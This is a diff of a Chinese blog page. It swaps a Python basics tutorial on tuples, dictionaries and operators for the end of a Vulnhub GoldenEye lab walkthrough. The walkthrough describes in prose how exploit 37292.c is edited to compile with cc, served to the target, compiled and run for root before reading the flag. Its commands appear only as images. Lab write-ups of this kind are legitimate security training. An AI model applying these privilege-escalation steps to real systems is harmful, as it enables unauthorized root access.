-<h4 id="in，max，min在元组中的使用">in，max，min在元组中的使用</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>1 in （1，2，3，4） -&gt; True；10 not in （1，2，3，4） -&gt; True</p>
-</li>
-<li class="lvl-2">
-<p>max((1,2,3,4)) -&gt; 4</p>
-</li>
-<li class="lvl-2">
-<p>min((1,2,3,4)) -&gt; 1</p>
-</li>
-<li class="lvl-2">
-<p>max和min在元组中使用的时候，元组中的元素不能是多种类型，如果类型不统一，则会报错</p>
-</li>
-</ul>
-<h3 id="字典类型">字典类型</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>字典是由多个键（key）及其对应的值（value）所组成的一种数据类型</p>
-</li>
-</ul>
-<h4 id="字典的结构与创建方法">字典的结构与创建方法</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>在python中，<mark>dict</mark>用来代表字典，并且可以创建一个字典</p>
-</li>
-<li class="lvl-2">
-<p>在python中，通过{}将一个个key与value存入字典中</p>
-<p><code>a = dict()</code></p>
-<p><code>a = {}</code></p>
-<p><code>person = {'name':'xiaoming','age':33}</code></p>
-</li>
-</ul>
-<h4 id="字典支持的数据类型">字典支持的数据类型</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>key支持字符串，数字和元组类型，但列表是不支持的</p>
-</li>
-<li class="lvl-2">
-<p>value支持所有python的数据类型</p>
-<p><code>a = {'name':'dewei','age':30}</code></p>
-<p><code>b = {1:'one',2:'two'}</code></p>
-<p><code>c = {(1,2,3):[1,2,3],(4,5,6):[4,5,6]}</code></p>
-</li>
-</ul>
-<h4 id="列表与元组中的字典">列表与元组中的字典</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>dict_array = [{1:1,2:2},{‘one’:1,‘two’:2}]</p>
-</li>
-<li class="lvl-2">
-<p>dict_tuple = ({1:1,2:2},{‘one’:1,"two’:2})</p>
-</li>
-<li class="lvl-2">
-<p><mark>元组一旦创建，就不可以改变</mark></p>
-</li>
-</ul>
-<h4 id="python3-7与之前版本-字典的区别">python3.7与之前版本 字典的区别</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>python3.7之前是无序的</p>
-</li>
-<li class="lvl-2">
-<p>python3.7之后是有序的</p>
-</li>
-</ul>
-<h4 id="字典的重要特性">字典的重要特性</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>字典中每一个key一定是唯一的</p>
-</li>
-</ul>
-<h3 id="数字的运算">数字的运算</h3>
-<h4 id="赋值运算符">赋值运算符</h4>
-<table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>描述</th>
-<th>举例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>=</td>
-<td>等于运算符</td>
-<td>c=a+b</td>
-</tr>
-<tr>
-<td>+=</td>
-<td>加法运算符</td>
-<td>c+=a -&gt; c=c+a</td>
-</tr>
-<tr>
-<td>-=</td>
-<td>减法运算符</td>
-<td>c-=a -&gt; c=c-a</td>
-</tr>
-<tr>
-<td>*=</td>
-<td>乘法运算符</td>
-<td>c*=a  -&gt;  c=c * a</td>
-</tr>
-<tr>
-<td>/=</td>
-<td>除法运算符</td>
-<td>c/=a -&gt; c=c/a</td>
-</tr>
-<tr>
-<td>%=</td>
-<td>取模运算符</td>
-<td>c%=a -&gt; c=c%a</td>
-</tr>
-<tr>
-<td>**=</td>
-<td>幂运算符</td>
-<td>c ** =a -&gt; c=c ** a</td>
-</tr>
-<tr>
-<td>//=</td>
-<td>整除运算符</td>
-<td>c//=a -&gt; c=c//a</td>
-</tr>
-</tbody>
-</table>
-<h4 id="b-kb-mb-gb-的转换">b kb mb gb 的转换</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>b kb mb gb 是计算机的计量单位</p>
-</li>
-<li class="lvl-2">
-<p>1024相差量</p>
-</li>
-</ul>
-<h4 id="字符串与数字的乘法">字符串与数字的乘法</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>字符串无法与字符串做乘法</p>
-</li>
-<li class="lvl-2">
-<p>字符串只可以和数字作乘法</p>
-</li>
-</ul>
-<h3 id="比较运算符">比较运算符</h3>
-<table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>描述</th>
-<th>举例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>==</td>
-<td>判断是否等于</td>
-<td>a==b</td>
-</tr>
-<tr>
-<td>!=</td>
-<td>判断是否不等于</td>
-<td>a!=b</td>
-</tr>
-<tr>
-<td>&gt;</td>
-<td>判断是否大于</td>
-<td>a&gt;b</td>
-</tr>
-<tr>
-<td>&lt;</td>
-<td>判断是否小于</td>
-<td>a&lt;b</td>
-</tr>
-<tr>
-<td>&gt;=</td>
-<td>判断是否大于等于</td>
-<td>a&gt;=b</td>
-</tr>
-<tr>
-<td>&lt;=</td>
-<td>判断是否小于等于</td>
-<td>a&lt;=b</td>
-</tr>
-<tr>
-<td><mark>&lt;&gt;</mark></td>
-<td><mark>判断是否不等于</mark></td>
-<td>a&lt;&gt;b</td>
-</tr>
-<tr>
-<td>is</td>
-<td>判断两个对象存储单元是否相同</td>
-<td>a is b</td>
-</tr>
-<tr>
-<td>is not</td>
-<td>判断两个对象存储单元是否不同</td>
-<td>a is not b</td>
-</tr>
-</tbody>
-</table>
+<p>kali搜索：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235528.png" alt=""></p>
+<p>然后把其复制到桌面</p>
+<p>查看一下靶机有没有gcc环境：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235525.png" alt=""></p>
+<p>靶机未安装gcc编译，只能用cc编译，需要修改37292.c编译</p>
+<p>第143行将gcc改为cc</p>
+<p>在本地用python开启http服务，让靶机下载</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235985.png" alt=""></p>
+<p>靶机下载<mark>37292.c</mark>：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235612.png" alt=""></p>
+<p>编译：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235196.png" alt=""></p>
+<p>给编译生成的可执行文件赋予权限：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182236779.png" alt=""></p>
+<p>执行，获得root权限：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182236439.png" alt=""></p>
+<p>查找flag，读取flag成功：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182236074.png" alt=""></p>
+<p>这个靶机打靶到此完成</p>
 <blockquote>
-<p>注：&lt;&gt;在python3里已经废弃，仅python2里可用</p>
-<p>​       <mark>单元存储</mark> 就是我们提过的<mark>内存块</mark></p>
+<p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p>
 </blockquote>
 
                 
@@ -1047,7 +738,7 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ahao8.top/posts/bb2d.html">https://www.ahao8.top/posts/bb2d.html</a>
+                    <a href="https://www.ahao8.top/posts/68c4.html">https://www.ahao8.top/posts/68c4.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1085,8 +776,16 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
+                                </a>
+                            
+                                <a href="/tags/vulnhub/">
+                                    <span class="chip bg-color">vulnhub</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
                                 </a>
                             
                         </div>
@@ -1412,17 +1111,18 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/b478.html">
+                <a href="/posts/68c4.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/8.jpg" class="responsive-img" alt="misc的基本解题思路(一)">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/1.jpg" class="responsive-img" alt="GoldenEye靶机详解">
                         
-                        <span class="card-title">misc的基本解题思路(一)</span>
+                        <span class="card-title">GoldenEye靶机详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1432,30 +1132,35 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/misc/">
-                        <span class="chip bg-color">misc</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
@@ -1469,30 +1174,31 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/3eeb.html">
+                <a href="/posts/651b.html">
                     <div class="card-image">
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/16.jpg" class="responsive-img" alt="我的第一篇博客文章">
                         
-                        <span class="card-title">我的第一篇博客文章</span>
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/21.jpg" class="responsive-img" alt="渗透测试基础入门(三)">
+                        
+                        <span class="card-title">渗透测试基础入门(三)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            谈谈我个人对博客的看法
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%97%A5%E5%B8%B8/" class="post-category">
-                                    日常
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -1502,12 +1208,12 @@ print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span><
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%97%A5%E5%B8%B8/">
-                        <span class="chip bg-color">日常</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/%E5%8D%9A%E5%AE%A2/">
-                        <span class="chip bg-color">博客</span>
+                    <a href="/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">
+                        <span class="chip bg-color">基础入门</span>
                     </a>
                     
                 </div>
